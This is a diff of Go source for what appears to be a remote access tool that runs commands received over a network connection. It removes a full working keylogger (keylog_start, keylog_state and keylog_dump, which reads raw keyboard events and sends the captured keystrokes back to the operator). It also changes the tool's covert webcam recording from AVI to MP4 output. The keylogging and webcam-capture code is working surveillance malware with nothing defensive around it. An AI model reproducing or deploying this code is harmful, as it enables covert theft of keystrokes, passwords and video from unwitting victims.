@@ -13,7 +13,6 @@ import (
 
 	sr "github.com/fstanis/screenresolution"
 	"github.com/kbinani/screenshot"
-	"github.com/MarinX/keylogger"
 	"gocv.io/x/gocv"
 )
 
@@ -121,79 +120,6 @@ func engage_via(conn net.Conn) {
 		} else if cmd == "record_webcam" {
 			result := video_recording(1, 5)
 			send_resp(conn, result)
-		} else if cmd == "keylog_start" {
-			if keylog_flag == 1 {
-				send_resp(conn, "Keylogger already running")
-			} else {
-				keylog_flag = 1
-				resp := "Keylogger started successfully"
-				// start a separate goroutine for the keylogger
-				go func() {
-					for {
-						select {
-						case <-stop:
-							return
-						default:
-							keyboard := keylogger.FindKeyboardDevice()
-							if len(keyboard) <= 0 {
-								resp = "No keyboard found"
-							} else {
-								if k, err := keylogger.New(keyboard); err != nil {
-									resp = err.Error()
-								} else {
-									for keylog_flag == 1 {
-										events := k.Read()
-										for e := range events {
-											switch e.Type {
-											case keylogger.EvKey:
-												if e.KeyRelease() {
-													tmp := ""
-													switch key := e.KeyString(); key {
-													case "R_SHIFT":
-														tmp = "[r-shift]"
-													case "L_SHIFT":
-														tmp = "[l-shift]"
-													case "Right":
-														tmp = "[r-arrow]"
-													case "Left":
-														tmp = "[l-arrow]"
-													case "ENTER", "Up", "Down":
-														tmp = ""
-													case "SPACE":
-														tmp = " "
-													case "BS":
-														tmp = "[backspace]"
-													case "CAPS_LOCK":
-														tmp = "[caps-lock]"
-													default:
-														tmp = key
-													}
-													keystrokes += tmp
-												}
-											}
-										}
-									}
-								}
-							}
-						}
-					}
-				}()
-				send_resp(conn, resp)
-			}
-		} else if cmd == "keylog_state" {
-			if keylog_flag == 1 {
-				send_resp(conn, "[+] Keylogger running")
-			} else {
-				send_resp(conn, "[-] Keylogger not running")
-			}
-		} else if cmd == "keylog_dump" {
-			if keylog_flag != 1 {
-				send_resp(conn, "Keylogger not yet running")
-			} else {
-				keylog_flag = 0
-				close(stop)
-				send_resp(conn, keystrokes)
-			}
 		}
 	}
 }
@@ -250,7 +176,7 @@ func webcam_snap() string {
 }
 
 func video_recording(tgt int, t int) string {
-	file := "/tmp/screen.avi"
+	file := "/tmp/screen.mp4"
 	var capture *gocv.VideoCapture
 	var width, height int
 
@@ -274,7 +200,7 @@ func video_recording(tgt int, t int) string {
 
 	capture.Set(gocv.VideoCaptureFrameWidth, float64(width))
 	capture.Set(gocv.VideoCaptureFrameHeight, float64(height))
-	writer, _ := gocv.VideoWriterFile(file, "MJPG", 30, width, height, true)
+	writer, _ := gocv.VideoWriterFile(file, "mp4v", 30, width, height, true)
 
 	endTime := time.Now().Add(time.Second * time.Duration(t))
 	for time.Now().Before(endTime) {
